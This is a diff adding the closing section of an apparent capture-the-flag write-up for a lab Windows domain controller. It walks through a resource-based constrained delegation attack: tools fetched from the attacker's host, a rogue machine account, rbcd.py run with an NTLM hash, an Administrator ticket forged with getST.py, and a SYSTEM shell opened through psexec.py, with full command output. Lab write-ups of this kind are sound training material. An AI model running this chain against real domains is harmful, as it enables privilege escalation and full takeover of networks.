@@ -297,3 +297,94 @@ The command completed successfully.
 *Evil-WinRM* PS C:\Users\L.Livingstone\Documents> net use /d \\192.168.49.197\share
 \\192.168.49.197\share was deleted successfully.
 ```
+
+
+Now that we have the bloodhound zip file we upload it to [Bloodhound](https://www.kali.org/tools/bloodhound/) and mark **L.Livingstone** as owned and select **shortest path from owned priniciples** in the analysis tab.
+
+![image](https://user-images.githubusercontent.com/87611022/187459044-17774641-1101-4724-99d4-525945db0258.png)
+
+we can see from the image above **L.Livingstone** has genericAll right which allows as to use [Resource based delegation](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation) attack to escalate our privileges
+
+I uploaded [powermad.ps1](https://github.com/Kevin-Robertson/Powermad) module to help us do this attack and [powerview.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) because it's Awesome!
+```
+*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> IWR -uri http://192.168.49.197/powermad.ps1 -Ou
+tFile powermad.ps1
+
+*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> IWR -uri http://192.168.49.197/powerview.ps1 -OutFile powerview.ps1
+
+*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> import-module .\powermad.ps1
+
+*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> import-module .\powerview.ps1
+```
+
+First I created a computer object using powermad:
+
+```
+*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> New-MachineAccount -MachineAccount shawarma -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
+Verbose: [+] Domain Controller = ResourceDC.resourced.local
+Verbose: [+] Domain = resourced.local
+Verbose: [+] SAMAccountName = shawarma$
+Verbose: [+] Distinguished Name = CN=shawarma,CN=Computers,DC=resourced,DC=local
+[+] Machine account shawarma added
+```
+
+Now we need a script to manage the delegation rights, I used [rbcd.py](https://github.com/tothi/rbcd-attack), this script will help us set `msDS-AllowedToActOnBehalfOfOtherIdentity` on our new computer object.
+
+```
+┌──(root💀kali)-[~/tryhackme/rooms/Practice/resourced]
+└─# python3 rbcd.py -dc-ip 192.168.197.175 -t RESOURCEDC -f 'shawarma' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone
+Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation
+
+[*] Starting Resource Based Constrained Delegation Attack against RESOURCEDC$
+[*] Initializing LDAP connection to 192.168.197.175
+[*] Using resourced\l.livingstone account with password ***
+[*] LDAP bind OK
+[*] Initializing domainDumper()
+[*] Initializing LDAPAttack()
+[*] Writing SECURITY_DESCRIPTOR related to (fake) computer `shawarma` into msDS-AllowedToActOnBehalfOfOtherIdentity of target computer `RESOURCEDC`
+[*] Delegation rights modified succesfully!
+[*] shawarma$ can now impersonate users on RESOURCEDC$ via S4U2Proxy
+```
+
+Next we need to get administrator's service ticket and export to it an environment variable named `KRB5CCNAME`.
+```
+┌──(root💀kali)-[~/tryhackme/rooms/Practice/resourced]
+└─# /opt/impacket/build/scripts-3.10/getST.py -spn cifs/resourcedc.resourced.local resourced/shawarma:'123456' -impersonate Administrator -dc-ip 192.168.197.175
+Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*]     Requesting S4U2self
+[*]     Requesting S4U2Proxy
+[*] Saving ticket in Administrator.ccache
+                                                                                                 
+┌──(root💀kali)-[~/tryhackme/rooms/Practice/resourced]
+└─# export KRB5CCNAME=./Administrator.ccache
+```
+We add ``resourcedc.resourced.local`` to our host file:
+```
+┌──(root💀kali)-[~/tryhackme/rooms/Practice/resourced]
+└─# sh -c 'echo "192.168.197.175 resourcedc.resourced.local" >> /etc/hosts'
+```
+
+And connect as system using [psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py):
+```
+┌──(root💀kali)-[~/tryhackme/rooms/Practice/resourced]
+└─# /opt/impacket/build/scripts-3.10/psexec.py -k -no-pass resourcedc.resourced.local -dc-ip 192.168.197.175
+Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation
+
+[*] Requesting shares on resourcedc.resourced.local.....
+[*] Found writable share ADMIN$
+[*] Uploading file FWBmNlms.exe
+[*] Opening SVCManager on resourcedc.resourced.local.....
+[*] Creating service wbtp on resourcedc.resourced.local.....
+[*] Starting service wbtp.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.2145]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+```
+
+That's it for this box it really challenging and fun, Thanks for reading through this writeup :)
